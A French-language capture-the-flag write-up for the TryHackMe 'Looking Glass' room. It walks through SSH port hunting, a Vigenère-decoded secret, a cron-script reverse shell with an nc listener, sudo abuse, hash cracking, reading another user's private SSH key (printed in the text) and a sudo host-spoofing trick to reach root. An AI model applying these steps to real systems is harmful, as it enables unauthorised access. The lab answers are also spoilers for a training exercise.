# ROOM
https://tryhackme.com/r/room/lookingglass

Un writeup fait a la va-vite comme d'habitude, mais promis je les referais plus propre !
# Enumeration
## NMAP
```
Le scan nmap montre le port 22, et ensuite une range de port de 9000 a 13999. Donc beaucoup de port...
```
En essayant d'afficher une page web sur plusieurs port, je passe par BurpSuite pour aller plus vite.
La réponse est toujours la même: **SSH-2.0-dropbear**

Après recherche, dropbear est un service SSH pour le matériel avec peu de spec, c'est peut-être un IoT (Internet of Things).
Je test de me connecter en SSH, la réponse du serveur est :
```
Lower
```
ou
```
Higher
```
en fonction du port sur lequel je tente de me connecter.

Vu le nombre de port, je vais pas pouvoir tout test manuellement cela serai bien trop long, on va donc faire un petit script pour test a notre place:
```bash
for i in $(seq 12855 13999);
do
    echo "Test sur le port $i"
    ssh -o "HostKeyAlgorithms=+ssh-rsa" -o "StrictHostKeyChecking=no" 10.10.24.153 -p $i
done
```
Ici, j'ai mis une sequence de 12855 a 13999 car j'avais déjà test quelques ports et j'avais donc déjà la range qu'il me fallais pour trouver le juste millieu.

Le port 12869 me répond autre chose que Lower ou Higher!
## Le bon port
```
Test sur le port 12869
Warning: Permanently added '[10.10.24.153]:12869' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky

'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxd[...REDACTED...]td

Enter Secret:
```
C'est du vigenère, une fois décoder on retrouve le secret :
Secret :
```
be[...REDACTED...]ck
```
On peu donc entrer le secret, et il nous affiche un compte SSH:
Compte SSH:
```
jabberwock:Mostly[...REDACTED...]hecked
```
# Exploitation
1er flag
```
jabberwock@looking-glass:~$ cat user.txt 
}32a9119[...REDACTED...]d56{mht
```
Le flag est vu depuis un mirroir, suffit de le reverse pour avoir le flag.

# Post exploitation
## Privesc to tweedledee
Dans le dossier /home de jabberwock on retrouve un script, un flag et un poeme.
Le compte jabberwork peux exectuer **/sbin/reboot** en tant que root sans passwd.

En regardant dans les taches cron, on vois que **tweedledum** execute le script.
Je modifie le script dans le home de **jabberwork** puis execute le sudo **/sbin/reboot**, sur ma machine, j'ouvre un listener
```
nc -lnvp 4444
```
J'ai revshell en tant que tweedledum.

## Privesc to tweedledum
En regardant les droits sur sudo avec **sudo -l** on vois qu'on peux executer **/bin/bash** en tant que **tweedledum**
```
sudo -u tweedledum /bin/bash
```
Nous voila en tant que tweedledum

## Privesc to humptydumpty
On retrouve ces hash dans un fichier :
```
dcfff5eb40423f055a[...REDACTED...]9816868f5766b4088b9e9906961b94
7692c3ad3540bb803c[...REDACTED...]123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb[...REDACTED...]9c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdc[...REDACTED...]c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6[...REDACTED...]633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5[...REDACTED...]b5e99fd62446677600d7cacef544d0
5e884898da28047151[...REDACTED...]603d0d6aabbdd62a11ef721d1542d8
746865207061737377[...REDACTED...]797877767574737271706f6e6d6c6b
```
Une fois décoder via crackstation, ils fonctionnent tous sauf le dernier.
Je passe donc via cyberchef et je trouve le password :
```
the password is zy[...REDACTED...]lk
```
C'est le mot de passe du compte de humptydumpty

## Privesc to Alice !
On ne peux rien voir ni écrire dans le dossier de alice, on a un accès refusé.

Je test de lire le fichier .bashrc, rien ne s'affiche, pour le coup c'est une bonne chose car je ne suis pas bloquer pour lire.
Je test donc de lire sa clé SSH et cela fonctionne :

```
humptydumpty@looking-glass:/home$ cat /home/alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhS[...REDACTED...]z7ds4f78z74xmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----

```
On peu se connecter en SSH en tant que Alice

## Privesc to root
Via linpeas, je trouve que le fichier **/etc/sudoers.d/alice** est lisible
```
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
le host est aussi en mirroir, **ssalg-gnikool** au lieux de **looking-glass**
J'essaye de le modifier mais je n'ai pas les droits.

en regardant le man de sudo, on peux définir un host avec le paramètre **-h**
```
-h host, --host=host
               Run  the  command on the specified host if the security policy plugin supports remote commands. The sudoers plugin does not currently support run‐
               ning remote commands. This may also be used in conjunction with the -l option to list a user's privileges for the remote host.
```
Je tente donc:
```
alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:~# id
uid=0(root) gid=0(root) groups=0(root)
```
Me voila root !
```
root@looking-glass:~# cat /root/root.txt 
}f3dae6[...REDACTED...]f6b7332cb{mht
```

# Bonus 
Pour lire les flags 'mirrored', on peu le faire avec python:

```python
flag = "}00000000000000000000000000000000{mht"
print(flag[::-1])
```
